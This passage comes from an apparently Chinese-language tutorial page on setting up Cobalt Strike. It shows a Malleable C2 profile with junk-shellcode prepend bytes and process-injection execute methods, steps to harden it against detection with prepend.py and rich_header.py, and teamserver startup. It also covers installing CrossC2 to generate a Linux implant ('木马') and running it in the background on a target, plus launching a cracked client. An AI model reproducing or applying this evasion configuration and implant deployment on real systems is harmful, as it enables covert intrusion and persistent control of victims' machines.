<a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a>    set userwx   &quot;false&quot;;   # 最终内存权限
<a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a>    transform-x86 {
<a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a>        prepend &quot;\x87\xdb\x66\x87\xd2\x49\x66\x90\x87\xd2\x0f\x1f\x00\x87\xc9\x41\x66\x87\xc9\x42\x44\x0f\x1f\x00\x40\x40\x66\x87\xdb\x0f\x1f\x04\x00\x48\x46\x4c\x90\x45\x43\x47\x66\x0f\x1f\x04\x00\x0f\x1f\x00&quot;;
<a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a>        #append &quot;\x90\x90&quot;;
<a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a>    }
<a id="__codelineno-21-12" name="__codelineno-21-12" href="#__codelineno-21-12"></a>    transform-x64 {
<a id="__codelineno-21-13" name="__codelineno-21-13" href="#__codelineno-21-13"></a>        prepend &quot;\x87\xdb\x66\x87\xd2\x49\x66\x90\x87\xd2\x0f\x1f\x00\x87\xc9\x41\x66\x87\xc9\x42\x44\x0f\x1f\x00\x40\x40\x66\x87\xdb\x0f\x1f\x04\x00\x48\x46\x4c\x90\x45\x43\x47\x66\x0f\x1f\x04\x00\x0f\x1f\x00&quot;;
<a id="__codelineno-21-14" name="__codelineno-21-14" href="#__codelineno-21-14"></a>        #append &quot;\x90\x90&quot;;
<a id="__codelineno-21-15" name="__codelineno-21-15" href="#__codelineno-21-15"></a>    }
<a id="__codelineno-21-16" name="__codelineno-21-16" href="#__codelineno-21-16"></a>
<a id="__codelineno-21-17" name="__codelineno-21-17" href="#__codelineno-21-17"></a>
<a id="__codelineno-21-18" name="__codelineno-21-18" href="#__codelineno-21-18"></a>    execute {
<a id="__codelineno-21-19" name="__codelineno-21-19" href="#__codelineno-21-19"></a>        CreateThread &quot;ntdll!RtlUserThreadStart+0x42&quot;;
<a id="__codelineno-21-20" name="__codelineno-21-20" href="#__codelineno-21-20"></a>        CreateThread;
<a id="__codelineno-21-21" name="__codelineno-21-21" href="#__codelineno-21-21"></a>        NtQueueApcThread-s;
<a id="__codelineno-21-22" name="__codelineno-21-22" href="#__codelineno-21-22"></a>        CreateRemoteThread;
<a id="__codelineno-21-23" name="__codelineno-21-23" href="#__codelineno-21-23"></a>        RtlCreateUserThread; 
<a id="__codelineno-21-24" name="__codelineno-21-24" href="#__codelineno-21-24"></a>    }
<a id="__codelineno-21-25" name="__codelineno-21-25" href="#__codelineno-21-25"></a>}
</code></pre></div>
<h3 id="profile-opsec">修改profile文件, 增强opsec的效果<a class="headerlink" href="#profile-opsec" title="Permanent link">&para;</a></h3>
<p><strong>prepend.py</strong>是一个 python 脚本，它生成动态垃圾 shellcode，该 shellcode 将附加在实际 shellcode 的开头。要使用该脚本，请执行：</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>python3 prepend.py
</code></pre></div>
<p>复制输出并将其粘贴到配置文件中（在 transform-x64 或 transform-x86 块内）。配置文件将如下所示：</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a> transform-x64 {
<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>prepend 
<a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>&quot;\x44\x40\x4B\x43\x4C\x48\x90\x66\x90\x0F\x1F\x00\x66\x0F\x1F\x04\x00\x0F\x1F\x04\x00\x0F\x1F\x00\x0F\x1F\x00&quot;;
<a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>#append &quot;\x90\x90&quot;;
<a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>    }
</code></pre></div>
<p><strong>rich_header.py</strong>是一个 python 脚本，它生成动态 shellcode，负责编译器插入的元信息。Rich 标头是一个 PE 部分，用作 Windows 可执行文件生成环境的指纹。要使用该脚本，请执行：</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>python3 rich_header.py
</code></pre></div>
<p>复制输出并将其粘贴到配置文件中。配置文件将如下所示：</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>stage {
<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>  ...
<a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>  set rich_header &quot;\x2e\x9a\xad\xf1...&quot;;
<a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>  ...
<a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a>}
</code></pre></div>
<h2 id="34profile">3.4检查profile文件<a class="headerlink" href="#34profile" title="Permanent link">&para;</a></h2>
<p>测试是否可用</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>chmod+x c2lint
<a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>./c2lint [/path/to/my.profile] # 如 ./c2lint bing_jx.profile
<a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>
<a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a># 进行各种协议 如 smb , http , https的请求模拟 , 判断是否可用 , 请求结束下面会有结果输出 (黄色警告,红色语法错误)
</code></pre></div>
<p><img alt="截图" src="117127a1e6c4866936076a0a60d87d80.png" /></p>
<p>使用profile文件 , 启动cs</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>./teamserver 192.168.101.48 123456 jquery-c2.4.5-jx.profile
</code></pre></div>
<h1 id="4cslinux">4.CS配置linux上线<a class="headerlink" href="#4cslinux" title="Permanent link">&para;</a></h1>
<h2 id="41-crossc2">4.1下载 CrossC2<a class="headerlink" href="#41-crossc2" title="Permanent link">&para;</a></h2>
<p>cs默认是不支持上线linux主机的 , 但是可以通过安装CrossC2插件实现 </p>
<p><strong>因为一些原因，目前强制只支持HTTPS beacon。</strong></p>
<p>下载地址 </p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>https://github.com/gloxec/CrossC2/releases
</code></pre></div>
<p><img alt="截图" src="e9ed64add38ff85f280aca74c58c2c84.png" /></p>
<p>然后解压zip压缩包 , 这里我放到cs安装目录的<strong> script</strong>目录 下 , 推荐这个目录</p>
<p><img alt="截图" src="d7f3c13863e6076d180b675e4d3c4325.png" /></p>
<h2 id="42">4.2安装插件<a class="headerlink" href="#42" title="Permanent link">&para;</a></h2>
<p>首先编辑<strong>CrossC2-GithubBot-2021-11-02.cna</strong>文件</p>
<p><img alt="截图" src="bd484bdec689ca3df0bead93c6353e67.png" /></p>
<p>复制cs服务端目录下的 .cobaltstrike.beacon_keys 到与 genCrossC2.Win.exe 在一个目录下</p>
<p><img alt="截图" src="d7f3c13863e6076d180b675e4d3c4325.png" /></p>
<p>启动cs , 使用客户端加载cna插件 ，选择Script Manager，添加CrossC2.cna (如果成功安装，菜单栏会多出一项 CrossC2)</p>
<p><img alt="截图" src="fb8b04ff3f94d9647294c87375ad6484.png" /></p>
<p>点击加载 , 选择 CrossC2-GithubBot-2021-11-02.cna 文件</p>
<h2 id="43">4.3上线测试<a class="headerlink" href="#43" title="Permanent link">&para;</a></h2>
<p>首先新建一个https的监听</p>
<p><img alt="截图" src="358fbca4040a756517593e2e2902f33d.png" /></p>
<p><img alt="截图" src="05d02c33f22e548c7d05ccbb81e87a5b.png" /></p>
<p><img alt="截图" src="ea4c6e90cee7c46da68cbe8c3ee94fe8.png" /></p>
<h2 id="44">4.4执行木马上线<a class="headerlink" href="#44" title="Permanent link">&para;</a></h2>
<p>生成的木马在客户端当前目录下</p>
<p><img alt="截图" src="94371dc9a030c4cf51e10b1791eb02ae.png" /></p>
<p>上传到linux机器, 执行</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>chmod +x t_cc2.out 
<a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>./t_cc2.out
<a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a># 后台运行
<a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a>nohup ./t_cc2.out &amp;
</code></pre></div>
<p>上线成功</p>
<h1 id="5cobaltstrike-cat-45">5.CobaltStrike-[Cat]-4.5<a class="headerlink" href="#5cobaltstrike-cat-45" title="Permanent link">&para;</a></h1>
<p>客户端登录：</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>C:\Users\86178\Desktop\Tools\cat_cs4.5_5.1_client\jdk-11.0.15.1\bin\java.exe  -jar cat_client.jar client
</code></pre></div>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  回到页面顶部
</button>
        
      </main>
      
        <footer class="md-footer">
  
    
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
    <div class="md-copyright__highlight">
      Copyright &copy; 2024 hypnotic
    </div>
  
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "../../../..", "features": ["header.autohide", "navigation.instant", "navigation.tracking", "content.code.annotate", "toc.integrate", "toc.follow", "navigation.path", "navigation.top", "navigation.tabs", "navigation.prune", "navigation.footer", "navigation.tabs.sticky", "navigation.sections", "content.code.copy", "navigation.indexes", "search.share", "search.suggest", "search.highlight"], "search": "../../../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
    
    
      <script src="../../../../assets/javascripts/bundle.83f73b43.min.js"></script>
      
        <script src="../../../../javascripts/extra.js"></script>
      
        <script src="../../../../javascripts/mathjax.js"></script>
      
        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
      
        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
      
    
  </body>
</html>